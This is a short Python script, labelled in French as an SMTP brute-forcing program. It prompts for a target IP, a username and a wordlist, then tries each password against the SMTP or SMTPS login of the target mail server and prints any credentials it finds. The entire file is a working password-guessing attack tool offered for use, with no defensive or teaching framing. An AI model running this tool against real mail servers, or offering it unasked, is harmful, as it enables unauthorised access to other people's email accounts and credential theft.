# Programme de brute forcing du protocole SMTP.

import smtplib, sys, socket, os
from smtplib import SMTP_SSL as SMTPS
from smtplib import SMTP 

global host, username, service, wordlist, password

def smtpconnect(password):
    if service == "smtp":
        try:
            smtpco = SMTP(host, port=587)
        except:
            resp = 2
            return resp

        try:
            smtpco.login(username,password)
            resp = 0
        except smtplib.SMTPAuthenticationError:
            resp = 1

        return resp
        smtpco.close()



    if service == "smtps":
        try:
            smtpco = SMTPS(host, port=465)
        except:
            resp = 2
            return resp

        try:
            smtpco.login(username,password)
            resp = 0
        except smtplib.SMTPAuthenticationError:
            resp = 1

        return resp
        smtpco.close()



try:
    host = input("Enter Target IP Adress > ")
    username = input("Enter Username > ")
    service = input("Enter Service smtp/smtps > ")
    if service != "smtp" and service !="smtps":
        sys.exit("Unknown service")
    wordlist = input("Enter Wordlist path > ")

    if os.path.exists(wordlist) == False:
        sys.exit("This file doesn't exist")

except KeyboardInterrupt:
    sys.exit("User interrupted the program")

inputfile = open(wordlist, "r")


for i in inputfile.readlines():
    password = i.strip("\n")

    try:
        response = smtpconnect(password)

        if response == 0:
            print("\n[!] User : {0} | Password Found : {1} \n".format(username,password))
            sys.exit(0)

        elif response == 1:
            print("[x] User : {0} | Password : {1} | Password Incorrect".format(username,password))

        elif response == 2:
            sys.exit("Connection Cannot be Etablished with {0}".format(host))
    except KeyboardInterrupt:
        sys.exit("User Interrupted the program")

        
